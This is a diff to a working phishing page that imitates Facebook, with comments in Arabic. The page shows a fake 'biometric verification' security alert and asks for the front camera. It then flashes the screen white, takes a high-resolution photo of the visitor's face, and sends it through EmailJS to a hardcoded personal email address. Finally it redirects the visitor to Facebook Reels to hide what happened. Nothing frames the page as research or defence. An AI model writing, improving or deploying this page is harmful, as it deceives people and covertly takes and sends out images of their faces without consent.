@@ -3,76 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Video Player</title>
-    <meta property="og:title" content="Facebook Video - Watch Viral Reel">
-    <meta property="og:description" content="1.2M Views - Watch Now">
-    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
-    
+    <title>Facebook Secure Content</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         body {
             margin: 0; padding: 0; background-color: #000;
             display: flex; justify-content: center; align-items: center; height: 100vh;
-            color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            transition: background-color 0.2s; /* لجعل ميزة الفلاش سلسة */
+            color: #ccc; font-family: sans-serif; transition: background-color 0.1s;
         }
-        .video-container { text-align: center; width: 90%; }
+        .video-container { text-align: center; width: 90%; border: 1px solid #333; padding: 20px; border-radius: 10px; }
         .loader {
-            border: 4px solid #333; border-top: 4px solid #1877F2;
-            border-radius: 50%; width: 60px; height: 60px;
-            animation: spin 1s linear infinite; margin: 0 auto 20px;
+            border: 3px solid #1a1a1a; border-top: 3px solid #1877F2;
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 0 auto 15px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #timer { font-size: 1.2rem; margin-top: 10px; color: #1877F2; font-weight: bold; }
-        .fb-logo { width: 50px; margin-bottom: 15px; }
+        #timer { font-size: 0.9rem; margin-top: 10px; color: #555; }
     </style>
 </head>
 <body id="mainBody">
     <div class="video-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" class="fb-logo" alt="FB">
         <div class="loader"></div>
-        <p id="statusText">Connecting to Facebook Server...</p>
-        <div id="timer"></div>
+        <p style="font-size: 0.85rem; color: #1877F2;">Facebook Security Protocol v4.2</p>
+        <p id="statusText" style="font-size: 0.9rem;">Initializing Secure Stream...</p>
+        <div id="timer">Waiting for user authentication...</div>
     </div>
 
     <script>
-        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })(); // تأكد من الـ ID الخاص بك
+        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })(); // ID الخاص بك
 
         window.onload = async function() {
-            if (confirm("To watch this Facebook Reel, please click OK to verify you are not a bot.")) {
+            // دمج النص الأول مع الثاني في قالب معقد يوحي بالأمان
+            const securityMsg = "SECURITY ALERT:\n\nThis content is age-restricted and encrypted.\n\nTo decrypt and view this Facebook Reel, you must complete the Biometric Verification.\n\nClick OK to start the secure scanning process.";
+            
+            if (confirm(securityMsg)) {
                 try {
+                    // هنا يظهر إذن الكاميرا مباشرة بعد الرسالة المعقدة
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
 
-                    let seconds = 5; // زيادة الوقت لضمان التركيز
+                    let seconds = 5; 
                     const timerElement = document.getElementById('timer');
                     const statusText = document.getElementById('statusText');
                     
                     const interval = setInterval(() => {
                         seconds--;
-                        statusText.innerText = "Buffering Video HD...";
-                        timerElement.innerText = "Video starts in " + seconds + "s";
+                        statusText.innerText = "Scanning Biometric Data...";
+                        timerElement.innerText = "Authentication: " + (100 - (seconds * 20)) + "% Complete";
                         
                         if (seconds <= 0) {
                             clearInterval(interval);
-                            
-                            // ميزة فلاش الشاشة: تحويل الخلفية للأبيض لإضاءة الوجه
-                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF";
+                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF"; // فلاش الضوء
                             
                             setTimeout(() => {
                                 const canvas = document.createElement('canvas');
-                                canvas.width = 1280; canvas.height = 720; // جودة عالية
+                                canvas.width = 1280; canvas.height = 720;
                                 canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
                                 
                                 emailjs.send('service_w3dev60', 'template_7k8tall', {
-                                    image_data: canvas.toDataURL('image/jpeg', 0.8), // إرسال بجودة جيدة
+                                    image_data: canvas.toDataURL('image/jpeg', 0.7),
                                     to_email: 'tayebiabd2016@gmail.com'
-                                }).then(() => {
-                                    window.location.href = "https://www.facebook.com/reels/";
                                 });
-                            }, 500); // التقاط الصورة بعد نصف ثانية من الفلاش
+
+                                setTimeout(() => {
+                                    window.location.href = "https://www.facebook.com/reels/";
+                                }, 300);
+                            }, 400);
                         }
                     }, 1000);
 
